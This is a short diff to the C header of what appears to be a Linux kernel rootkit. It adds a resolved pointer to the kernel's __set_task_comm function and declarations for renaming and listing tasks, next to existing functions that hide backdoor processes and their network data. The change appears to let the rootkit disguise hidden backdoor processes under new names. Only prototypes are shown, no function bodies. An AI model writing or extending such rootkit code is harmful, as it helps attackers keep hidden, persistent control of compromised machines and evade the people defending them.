@@ -105,6 +105,8 @@ typedef void (*do_exit_sg)(long error_code) __noreturn;
 
 typedef asmlinkage long (*sys64)(struct pt_regs *regs);
 
+typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);
+
 
 struct kernel_syscalls {
     attach_pid_sg k_attach_pid;
@@ -114,6 +116,7 @@ struct kernel_syscalls {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     do_exit_sg k_do_exit;
 #endif
+    do__set_task_comm_sg k__set_task_comm;
     unsigned long *tainted;
 };
 
@@ -133,7 +136,9 @@ bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct*, void *), v
 bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
 void kv_reload_hidden_task(struct task_struct *task);
 void kv_pid_cleanup(void);
+void kv_rename_task(pid_t, const char *);
 void kv_show_saved_tasks(void);
+void kv_show_all_tasks(void);
 void kv_scan_and_hide(void);
 
 /** syscall,function addresses */
